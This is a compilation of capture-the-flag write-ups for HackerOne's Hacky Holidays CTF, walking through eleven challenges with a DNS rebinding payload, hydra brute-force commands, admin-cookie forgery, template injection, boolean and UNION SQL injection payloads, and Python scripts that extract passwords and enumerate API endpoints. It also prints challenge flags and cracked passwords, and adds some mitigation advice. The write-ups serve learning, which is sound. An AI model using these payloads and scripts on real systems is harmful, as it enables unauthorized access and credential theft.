`127.0.0.1` we receive the following address: `cb007121.7f000001.rbndr.us`. With `dig A cb007121.7f000001.rbndr.us` we can confirm that the address indeed resolves to any of the two domains randomly:
```
cb007121.7f000001.rbndr.us. 1	IN	A	203.0.113.33
cb007121.7f000001.rbndr.us. 1	IN	A	127.0.0.1
```
Again we can construct a new payload and base64 encode it: 
```
{"target":"cb007121.7f000001.rbndr.us","hash":"aa9c061c933f709acb4d69329bc7b1af"}
eyJ0YXJnZXQiOiJjYjAwNzEyMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiJhYTljMDYxYzkzM2Y3MDlhY2I0ZDY5MzI5YmM3YjFhZiJ9
```
With the following path we can launch our attack: `/attack-box/launch?payload=eyJ0YXJnZXQiOiJjYjAwNzEyMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiJhYTljMDYxYzkzM2Y3MDlhY2I0ZDY5MzI5YmM3YjFhZiJ9`. The attack might not be successful on the first try, but after a few attempts the DNS rebinding attack is successful and we are knocking off the Grinch's server, and getting reconnected to `https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709` were we are presented with the final flag.

## Impact

Positive impact on my life.

---

### [Writeup Hackyholiday CTF](https://hackerone.com/reports/1065731)

- **Report ID:** `1065731`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @abdilahrf_
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T18:00:32.236Z
- **CVE(s):** -

**Vulnerability Information:**

Hi there,

Find my writeup on attached :) 

{F1128138}

Thanks adam for making the CTF, Really PAIN for my head!

## Impact

Hackerone Hoodie ? 😍😍

---

### [[hacky-holidays] Grinch network is down](https://hackerone.com/reports/1066206)

- **Report ID:** `1066206`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @mzfr
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T18:00:06.496Z
- **CVE(s):** -

**Vulnerability Information:**

# Flag 1

As always CTF begins with a tweet:

{F1126838}

So we are supposed to start from https://hackyholidays.h1ctf.com/ . 

The first flag was easy on https://hackyholidays.h1ctf.com/ I found a file named [`robots.txt`](https://hackyholidays.h1ctf.com/robots.txt) which had the following content:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

# Flag 2

From flag 1 we found `/s3cr3t-ar3a` path so we try to visit this on the main website. https://hackyholidays.h1ctf.com/s3cr3t-ar3a, weget the following website:

{F1126839}

Checking out the source using the `Ctrl+U` doesn't shows the flag. But if we open the developers option(`ctrl+shift+e` in firefox and `ctrl+shif+i` in chrome) in the source we can see the following lines:

```html
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
	<p>I've moved this page to keep people out!</p>
	<p>If you're allowed access you'll know where to look for the proper page!</p>
</div>
```

And here we can see our flag:

```
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
```

{F1126840}

__Why didn't we saw the flag in the source code?__

This is because the `data-*` attributes are used to store data in private to the page or the application. And when we "view-source" of any webpage we see the HTML as it was delivered from the web server to our browser.  That means we won't see any private HTML attribute, in our case `data-info`. But when we `Inspect Element` using the developer options that time we are looking at the current state of the DOM tree after:

- HTML error correction by the browser
- HTML normalization by the browser
- DOM manipulation by JavaScript

and after all this we are able to see even the `private` attributes set in the HTML.

# Flag 3

For this flag we start from the initial page i.e https://hackyholidays.h1ctf.com/. There we see that a new button has appeared now. Clicking on that button we are taken to `/people-rater` path on the website.

The `people-rater` page looks like:

{F1126842}

If we click on any button on any name we get an alert with certain rating in return. Ex if we click on `Tea Avery` we get an alert box saying `Awful`

{F1126841}

If we look at the source code of the page we can see the following ajax code:

```ajax
<script>
    $('.thelist').on("click", "a", function(){
        $.getJSON('/people-rater/entry?id=' + $(this).attr('data-id'), function(resp){
            alert( resp.rating );
        }).fail(function(){
            alert('Request failed');
        });
    });
    var page = 0;
    $('.loadmore').click( function(){
        page++;
        $.getJSON('/people-rater/page/' + page, function(resp){
            if( resp.results.length < 5 ){
                $('.loadmore').hide();
            }
            $.each( resp.results, function(k,v){
                $('.thelist').append('<div style="margin-bottom:15px"><a class="btn btn-info" data-id="' + v.id + '">' + v.name + '</a></div>')
            });
        });
    });
    $('.loadmore').trigger('click');
</script>
```

We can see that whenever we click on any name/button the `data-id` is taken out and a request is sent to `HOST/people-rater/entry?id=<data-id-value>` and the rating is then presented to us on the alert box. 

***

Now the interesting thing here is that all the `data-id` are in `base64` encoded. If we click on the very first name i.e `Tea Avery` we will see that request is sent to `https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=` this URL. If we decode the base64 value i.e `eyJpZCI6Mn0=` we will get `{"id":2}`. The moment you see this it hits you that why the very first name on the website have the `id` set to `2` and not `1` or `0`.

So we check that who is being assigned the `id:1` that can be done by encoding `{"id":1}` in base64 which will give you `eyJpZCI6MX0=`.

If we send the request to `https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=` 

{F1126843}

```
flag{b705fb11-fb55-442f-847f-0931be82ed9a}
```

# Flag 4

For 4th flag we start from https://hackyholidays.h1ctf.com/ and we can see in the `app` section a new `Swag Shop` button is available.

When we click on that button we get an `information alert` on that page:

```
Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.
```

Once we start the challenge we are taken to https://hackyholidays.h1ctf.com/swag-shop

{F1126845}

If we click on any of these buttons we get an alert asking for login, which we don't have. After looking through the source of the page and some requests I found out that the `login` request was going on `https://hackyholidays.h1ctf.com/swag-shop/api/login` so I tried to find if there is any endpoint for `register` but didn't find any.

Then I decided to FUZZ to see if I can find any other page. For fuzzing I used [ffuf](https://github.com/ffuf/ffuf) with dirsearch's wordlist i.e [dicc.txt](https://github.com/maurosoria/dirsearch/blob/master/db/dicc.txt).

{F1126846}

So we found a path `/sessions`, if we open that in a browser we get the a dictionary/JSON having some session values:

{F1126848}

Initially it looked like JWT token to me but then I saw that they were long base64 encoded strings. I decoded them and all of them had the `user` set to `null` except 1.

```
eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
```

If we decode this we get:

```json
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```

Now we know the user value so we can try to visit the `/user` endpoint we found and see if we can find the flag.

{F1126847}

If we visit that endpoint we get an error saying `value is missing` that means we need to try to send the `user` value on this endpoint. I tried to use parameter like `id`, `username`, `user` but none of those worked. I then figured out that the user value we got after decoding was in `uuid` so I tried to pass that value as `uuid=` and it worked.

{F1126849}

```
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
```

## Flag-5

For this flag we start from https://hackyholidays.h1ctf.com/secure-login. If we visit that page we get a login form. I spent some time trying to find the ways to bypass this login but couldn't. But then I noticed that the whenever we enter just the username it didn't ask us to also enter the password and returned the error `Invalid Username`. Now this gave me a slight hint that brute force of the crendentials was required.

I used [hydra](https://github.com/vanhauser-thc/thc-hydra) to get the correct username and password.

For getting the usernames I used this([Seclist/names.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt)) wordlist:

```bash
hydra -L names.txt -p password -t 64 hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Username"
```

- `-L` means the username list
- `-p` is the fixed string which will be used in the password field.
- `-t 64` means the number of threads
- after that we provide the HOST to attack on
- `https-post-form` is the module used for this attack
- `/secure-login:username=^USER^&password=^PASS^:Invalid Username`
	- The breakdown of this string is in the following format:
	- {path where the attack is going to happen}:{name of the field in which username will be placed}={the usernames from the names.txt}&{name of the field in which password will be placed}=^{value of password}^:{Error message which shows the wrong username was used}

{F1126850}

Now we have the username lets use this to find the correct password. For finding the correct password I used, [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)

The hydra command would be:

```bash
hydra -l access -P rockyou.txt -t 64 hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Password"
```

{F1126851}

Now we have username and password, using these credentials I logged in but got the following page:

{F1126852}

I was bit confused and wasn't sure what I have to do. I tried looking for the flag everywhere, in the source of the page, via the inspector of developer tools but couldn't find it. After spending sometime looking I noticed something, the cookie that was being set after the valid login looked like:

```
Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D
```

This looked like a base64 encoded string so I decoded it and got:

```bash
-> echo "eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=" | base64 -d
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}  
```

That means I have to change the value of `admin` to `true`. 

```bash
-> echo "{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}" | base64
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```

This is our new encoded cookie, if we use this to send the request on `/secure-login` endpoint we will see a new file listed on the webpage with the name `my_secure_files_not_for_you.zip`

{F1126853}

I downloaded that file but it was password protected. This mean we have to crack the password of this ZIP file. For this task I used one of the utility of [JTR](https://www.openwall.com/john/) i.e `zip2john`

```bash
-> zip2john my_secure_files_not_for_you.zip > hash.txt 
```

Then I ran [`john`](https://www.openwall.com/john/) on `hash.txt` to crack the password:

```bash
-> john hash.txt
```

Once the password was cracked I ran `john --show hash.txt` to see the password.

{F1126854}

Using this password I opened the ZIP file which had two files:
- flag.txt
- xxx.png

The flag was in `flag.txt`

```
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

# Flag 6

We see another tweet from HackerOne:

{F1126855}

That means for flag-6 we are going to hack grinch's diary.

We start from the home page and in the `app` section there is new challenge added named `my-diary`. If we start the challenge we are taken to `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html`. Now there wasn't anything interesting in the page source so I started looking in the networks tab to see if I could find anything.

After baning my head on this for few hours I talked with my friend from OpenToAll team, neolex. They gave me a hint by saying `think "where I am"`. First of all it seemed like a really bad hint but then I realized currently in the URL we are including a `template` named `entries.html` and we are on the `index` page. So I tried to include the `index.php` in place of `entries.html` and I got a empty page but in the source of that page was the `php code`:

```php

<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Now if we look at this source code we can see the comments says that the `admin.php` has been replaced with `secretadmin.php` but if we try to include that page it will go back to `entries.html` because there is a check in that source code.

```php
$page = str_replace("admin.php","",$page);
$page = str_replace("secretadmin.php","",$page);
```

These lines in the code replaces the `admin.php` or `secretadmin.php` with `""` i.e empty string.

So we need to pass a string in such a manner that even after both of these replacements are done we'll still get `secretadmin.php`. To do this I decided to locally test this process.

```php
<?php

$page = "secretsecretadadmin.phpmin.phpadadmin.phpmin.php";
$page = str_replace("admin.php", "", $page);
$page = str_replace("secretadmin.php","",$page);
echo $page;
```

This is the code that returned `secretadmin.php` even after replacements.

So if we visit https://hackyholidays.h1ctf.com/my-diary/?template=secretsecretadadmin.phpmin.phpadadmin.phpmin.php we will get our flag and we can clearly see the motives of the Grinch.

{F1126856}

__Mitigation__

As we can see that using `str_replace` caused the issue and resulted in giving access to the place where an attacker should be. That it is better to avoid using such functions for a functionality like including a file. 
A better check which would have prevented from any accessing sensitive files, in our case `secretadmin.php` or even `index.php` would be to have a white list of all the files that you would like to allow access to and if any other file is present then just show `403` or redirect to default page.

Ex:

```php
if (in_array($page, $WHITE_LIST_ARRAY)) {
	// include the page or do whatever is to be done
}
```
## Flag 7

Another day another tweet:

{F1126857}

For this flag we had to start with the `hate-mail-generator`(https://hackyholidays.h1ctf.com/hate-mail-generator). We can see that there is a `create` button and other than that there is an existing `hate-mail`. The existing hate-mail looks like:

{F1126858}

Even though we can't edit this message we can try to create a new one.

If we try to create a new one we get an error saying we don't have enough credits to do that but one thing to notice is that `{{name}}` is automatically converted to `Alice` when we preview our new mail. After trying lot of Template injection payload I came to the conclusion that this has nothing to do with SSTI. But when I trying loads of stuff here I noticed an error, if we trying any payload like: `{{template:RANDOMTHINGS}}`

```
Cannot find template file /templates/hashadhasd
```

So I tried to visit the `https://hackyholidays.h1ctf.com/hate-mail-generator/templates/` and this gives us the list of all the available templates:

{F1126859}

When I tried to include that it gave error about permissions. After spending sometime on the `hate-mail-generator/new` I noticed something in the source code:

```html
<form method="post" action="/hate-mail-generator/new/preview" id="previewfrm" target="_blank">
    <input type="hidden" name="preview_markup">
    <input type="hidden" name="preview_data" value='{"name":"Alice","email":"alice@test.com"}'>
</form>
```

Here we can see that `name` was defined and that is why it was we get `Alice` whenever we use `{{name}}`. We can confirm that this data was being used by trying `{{email}}` and it will be replaced by `alice@test.com` when we preview it.

So I thought since this data was being processed I started to inject various things inside this but the max I got from this was simple HTML injection and nothing big. Using this information and the name of the template that I found before I thought maybe we can try to include that template.

First I tried `value='{"name":"38dhs_admins_only_header.html","email":"admin@test.com"}'` but it directly printed the name of that template without `rendering` it. And that's when I realized that to render any template the website is using the format, `{{template:<TEMPLATE_NAME>}}` so that's what I did.

On `/hate-mail-generator/new` I inspected the element and edited the `preview_data` to the following:

```html
value='{"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}'
```

and then in the form I added `Hi {{name}}` and BOOM 💥

{F1126860}

```
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
```

__Mitigation__

Well this is something definitely what the admin of the website wanted obviously because this double template stuff is not that would arise in real world but if it may then the best way to fix it is:
1) Don't enable directory listing on of the directory that might contain any kind of sensitive information
2) Don't allow the user to render any kind of input
	1) Not this can be argued that if a website is some forum or something similar which gives the user to improve/beautify their profile. But even in that case the developers should makes sure that all the user inputs are sanitized properly. 

# Flag 8

{F1126861}

Looks like we are hacking the grinch's forum this time.

For this flag grinch has supposedly setup a forum and the endpoint for this challenge is `/forum/`. We are supposed to access the admin section of this forum

There seems to be some existing post about christmas and some `good things to do` but those doesn't have anything special which might hint toward something that we want. After looking through network tab and source of all the pages, I started to FUZZ to see if I find anything hidden.

{F1126862}

We can see that there is also an endpoint called `phpmyadmin`.  But even after fuzzing I couldn't find anything else. The `phpmyadmin` page was secured by login page as well. So after banging my head for a while I asked for a hint from my friend `neolex` and he said `OSINT is going to help`. With this in mind I googled lot of things related to the forum and phpmyadmin but nothing was giving it away but then I found something interesting. I googled `grinch forum github` and almost at the end of the search page saw something interesting.

{F1126863}

AFAIK [adamtlangley](https://github.com/adamtlangley) is the one who made these challenges and we can see that he did a commit to a repo named `Grinch-Networks/forum`. So I cloned that repo and started going through the code because that was the code of the `forum` app.

In that I found a commit which had the credential(common mistake among devs)

{F1126865}

So I used these to login into the `/phpmyadmin` and there I found credentials for two other users:

{F1126864}

And among these the user `grinch` is the `admin`. But the thing is these are not the passwords but the `md5` of the real password. To find the password of the md5 I used [crackstation.net](https://crackstation.net/). 

{F1126866}

So that means the password for `grinch` is `BahHumbug`. Once we login with these credentials we'll see a new post in the `Admin` section, named `Secret Plans` and that's where we'll find the flag.

{F1126867}

```
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
```

# Flag 9

{F1126868}

So Now there is a new Quiz released which tells you wether you are as evil as the Grinch. We are supposed to take the quiz here(https://hackyholidays.h1ctf.com/evil-quiz)

The page have three `tabs` first ask your name then on clicking `next` you are taken to `/evil-quiz/start` and the quiz ask 3 questions and then it shows your score on `/evil-quiz/score`. Initially I didn't notice anything different in this flow so I went to `admin` login page at `/evil-quiz/admin` but I didn't find any credentials so login directly wasn't an option.

Since the login page didn't seemed to give away anything I started to try all sorts of payload on the `name` field of the `quiz`. I tried everything some basic SSTI, XSS , SQLi payload and that's when I noticed something. Everytime we set some query like `grinch' or '1'='1`, in the `score` we'll see that `There is 30000 other player(s) with the same name as you!` and if we try `grinch' or '1'='2` we'll get `There is 265 other player(s) with the same name as you!`. This tells us that we are dealing with a `Boolean Based SQL injection`.

__What is Boolean based SQLi?__

This is a type of SQL Injection using which an attacker can know whether the SQLi payload they tried worked on the DB or not., depending on the HTTP response received. The payload will not directly return data from the DB but the HTTP response can be used to further exploit the information.

__What we as an attacker can do?__

In our case a value `greater than 30000` represent `TRUE` or `SUCCESS` and the value aroudn `200` represents `FALSE`

So we can try to run payload which has the following format:

```
grinch' or '1'='(Select column_name FROM all_tables WHERE table_name like 'a%')--
```

Now if we get something in 6 digits that means there is a table name starting with `a` and that way we will have to test all the characters/numbers. 

Since now we know what this is we need to do the following:

1) Find the table name in which the admin credentials could be stored
2) Then find the column names in that table
3) Finally find the correct password for those.

The first query that I tried was 

```
grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'a%' LIMIT 0,1) -- -
```

And I got a 6 digit number showing that there was a table name starting with `a` and that's when I guessed it that since we are looking for `admin` password lets see if there is a table name `admin`

so I did:

```
grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'admin' LIMIT 0,1) -- -
```

And again got a 6 digit number mean my guess was right. Now we need to find the `column_names` again for this one I first tried to see if there was any column name `username` in the `admin` table.

```
grinch' or 1=( SELECT 1 FROM information_schema.columns WHERE table_name='admin' AND column_name like 'username%' LIMIT 0,1) -- -
```

This also returns the 6 digit number so this time I used `password%` and got confirmation that such column exists.

So far we have found that there is a table named `admin` which have column names `username` and `password`. Now again for guessing the username I thought it would be nice to try some normal usernames like `grinch` or `admin`.

I tried this and got the 6 digit number showing that there is a username `admin`

```
grinch' or 1=( SELECT 1 FROM admin WHERE username like 'admi%' LIMIT 0,1) -- -
```

So that means the username is `admin` but password will be hard to guess so I'll decided to write the code:

```python
import re
import requests

URL = "https://hackyholidays.h1ctf.com/evil-quiz"
strings = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$&\'()*+,-./:;@_"
username = ""

while True:
    print("password: ", username)
    for i in strings:
        cookies = {
            "session": "1c0c8fea0d49a4e09317092fa1dbef21",
            "expires": "Tue, 22-Dec-2020 11:03:29 GMT",
            "Max-Age": "86400",
            "path": "/evil-quiz",
        }
        payload = {
                "name": "grinch' or 1=( SELECT 1 FROM admin WHERE password LIKE BINARY '{}%') -- -".format(
                (username+i)
            )
        }
        print("Trying: ", payload["name"])
        r = requests.post(URL, cookies=cookies, data=payload)

        start_url = URL + "/start"
        data = {"ques_1": "0", "ques_2": "0", "ques_3": "0"}
        r = requests.post(start_url, cookies=cookies, data=data)

        search = re.search(
            b'<div style="margin-top:20px">There(.*)</div>', r.content, re.IGNORECASE
        )
        number = len(search.group(1).split()[1])

        if number > 5:
            username = username + i
            break
        else:
            continue

```
{F1126870}

With this script I was able to find the password, `S3creT_p4ssw0rd-$`. Now using these credentials(`admin:S3creT_p4ssw0rd-$`) I logged in and found the flag.

{F1126869}

__Mitigation__

Even though we had to do quite a lot of things in this in the end it is actually a SQLi so I think the best way to fix this is just to sanitize the user input properly.

# Flag 10

{F1126871}

According to the [H1 tweet](https://twitter.com/Hacker0x01/status/1341005505506918402) The Grinch is recruiting for his evil army and we were given a new `signup` page for that.

{F1126874}

We can see that there is option for signup as well as login. In the source of that page I found the following comment:

```HTML
<!-- See README.md for assistance -->
<!DOCTYPE html>
<html lang="en">
```

This means that there could be a file name `README.md` on the server so I tried to visit `/signup-manager/README.md` and a markdown file was downloaded and had the following content in it:

```
# SignUp Manager
SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install
1) Create a directory that you wish SignUp Manager to be installed into
2) Move signupmanager.zip into the new directory and unzip it.
3) For security move users.txt into a directory that cannot be read from website visitors
4) Update index.php with the location of your users.txt file
5) Edit the user and admin php files to display your hidden content
6) You can make anyone an admin by changing the last character in the users.txt file to a Y
7) Default login is admin / password
```

In this we can see that some kind of `signUp Manager` is used to store the users. The important points to notice are `2` and `6`, because `2` point tells us that there is a file named `signupmanager.zip` on the server. And `6`th point tells us that if last character is `Y` for any user then that user will be admin(what we need to get the flag).

First I downloaded the zip file and that had the source of the `signupmanager` app.

The important function in the `index.php` was `addUser`

```php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```

What is happening here is that all the inputs are getting padded with the `#` to make them of a certain length and right before writing them in the `users.txt` it's made sure that the line is of length `113`. We can also see that last character of every line will be `N` meaning none of the new user will be `admin`. After looking at this function I started looking at the code from where `addUser` function is getting called.

```php
if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
			.....
			.....
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            .....
			.....
			$lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            .....
			.....
			if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
				.....
				.....
            }
        }
```

Now before we dive in the source code we will have to understand that if all the new user added have `N` at the end then the only way to become an admin is to find a way to overflow any one of the input field and have `Y` as the end character so that when the `addUser` function call the `substr($line,0,113);` the last character will be `Y`

Let's look at the source code which is calling the `addUser` function:
- The  `username`, `firstname` and `lastname` should be less than `15` length, if they'll be more than that then only the starting 15 characters will be considered so we 
can't just overflow one of these.
- If we look at the `password` field we can see `md5()` is being calculated that means no matter what we enter as the password the `md5` will result in something else and won't give us what we want
- Now `age` is the only field that doesn't have any `substr` check. But there are few other checks on the `age` field.

```php
if (!is_numeric($_POST["age"])) {
	$errors[] = 'Age entered is invalid';
}
```
This makes sure that the age value is a `numeric` so we can't have `100Y`

```phph
if (strlen($_POST["age"]) > 3) {
	$errors[] = 'Age entered is too long';
}
```
This check make sure that the `age` shouldn't be greater than 3.

```
$age = intval($_POST["age"]);
```
This is not a check but this make sure that the `age` value is `int` type.

 I started playing with `is_numeric` and `intval` function locally and I found the way to solve this. If we enter something like `1e1` both the function clears it. why? Because `1e1` is a `exponential` number. 

{F1126872}

So if we can enter something like `1e3` the `is_numeric` function will clear it and the `strlen` will also clear it cause it's exactly `3` length but when we will get to the `intval` function it will change `1e3` to `1000`.

{F1126873}

**DAMN YOU PHP**

__What do we have to do to get the flag?__

1) Set the last name to string with length `15` but the last character should be `Y`
2) set the age to `1e3`

You can use `burp suite` to capture the request and send it but I used the `dev tools` and my post data looked like:

```
action=signup&username=mzfr&password=mzfr&age=1e3&firstname=mzfr&lastname=mzfrmzfrmzfrmzY
```

and this will add a new user named `mzfr` with the password `mzfr` and `admin privileges`.

{F1126875}

This is the best challenge till now, I just loved it cause I learned new things about PHP and I know why I have to stay away from it 😝

__Mitigation__

1) I think it's better to just stick with Database for storing users, just sanitize the stuff.
2) In this challenge we saw that `is_numeric` and `intval` messed things up, it would have been nice if the `strlen` check was done after `intval`, that would have just prevented `overflow`
3) Also in place of `is_numeric` it would much secure if [ctype_digit](https://www.php.net/manual/en/function.ctype-digit.php) would have been used. In the `ctype_digit` the `1e3` would have returned `0`(false).

# Flag 11

{F1126913}

In the flag 10 we saw that we were given a new URL `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59`

I have no words about this challenge. If we start looking at the URL we see a list of albums

{F1129465}

If we check all those URLs all we can see that there are images in the format: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k`

But all the images have the URL in the following format: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9`

If we decode that base64 we will get the following data:

```json
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```

Now I just have to say it again I had literally no clue what the vulnerability was. I spent hours looking for everything but got nothing. Then on hackerone discord I saw the following message by @mcipekci

```
mcipekci Today at 5:57 PM  
tbh 9th and 11th are same issue but different variants
```

So I started looking for SQLi in the `hash` parameter and the `data` parameter, for some reason I spent more time on the `data` parameter of the `/picture` but got nothing. So again I asked for some hint from @neolex and he told me try the another `hash` parameter.

After trying various payloads I found the following to return the table names:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436%27%20UNION%20ALL%20SELECT%20NULL,NULL,GROUP_CONCAT(%27\n%27,table_name)%20FROM%20information_schema.tables--%20-
```

{F1129472}

But again dumping tables didn't help at all cause there wasn't anything interesting inside those tables. Again hitting, what feels like a dead end I started to enjoy the chatter on the `discord channel` when @adam decided to drop another hint.

{F1129466}

Now this is an image from the insecption so I couldn't make sense out of it. After enjoying banter on the discord channel about `how evil adam is` and how `great inception was as a movie` I decided to get back on the challenge and focus on the hint more.

The thing was that I know the Vuln is `SQLi` and inception is a movie related to `dreams in dreams` and what not. But if we have to think that in sense of SQL that would mean `nested queries`. So I started testing various stuff like

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436' UNION ALL SELECT NULL,NULL,GROUP_CONCAT(UNION ALL SELECT NULL,NULL,NULL) FROM information_schema.tables WHERE table_name like 'a%'-- -
```

or

```
UNION ALL SELECT NULL,NULL,( UNION ALL SELECT NULL,NULL,NULL)-- -
```
 These queries are far from anything so I decided to spend sometime with the nested queries and that's when I figured out:
 
```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,1 -- -",'12',1-- -
```

This payload gives us:

{F1129468}

Now there are 2 images which we already had but one image can't be loaded and if we look at the URL of that image it looks like:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEiLCJhdXRoIjoiY2I4YTJhOGY1ODZhN2NkZjdjNzY4MmMxOTZiMmYyZWQifQ==
```

Decoding the encoded part we can see:

```
{"image":"r3c0n_server_4fdk59\/uploads\/1","auth":"cb8a2a8f586a7cdf7c7682c196b2f2ed"}
```

That means whatever we provided in the `SQLi` payload is some how gets attached to the `images` path. Now @adam had already said this several times on discord that `auth` token can only be generated by the `server` that means we only have to mess with the image path.  

If we take a step back we know there is `/api/` endpoint exists which have the following data:

{F1129467}

But we can't access that API or any endpoint of that API without authentication. So now things starts to get connected we use `sqli` to get injection inside the path with an `auth` token and then we try to access that path. That means we can access any endpoint as authenticated user. But for this to work we'll have to find the valid `/api/` endpoint. Since this wasn't possible using ffuf or anything like that I wrote a small script:

```python
import requests
import re
from bs4 import BeautifulSoup

HOST = "https://hackyholidays.h1ctf.com"
hash_URL = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/{}' -- -",'12',1-- -"

with open("lists/objects-lowercase.txt", "r") as f:
    data = f.read().split("\n")

for endpoint in data:
    r = requests.get(hash_URL.format(endpoint.strip()))
    soup = BeautifulSoup(r.content, "html.parser")
    next_url = soup.findAll("img", {"class": "img-responsive"})
    if next_url:
        new_url = HOST + next_url[-1]["src"]
        nr = requests.get(new_url)
        if nr.content != "Expected HTTP status 200, Received: 404":
            print(endpoint, "--", new_url)
```

The wordlist user in this is [objects-lowercase.txt](https://github.com/chrislockard/api_wordlist/blob/master/objects-lowercase.txt)

{F1129471}

```
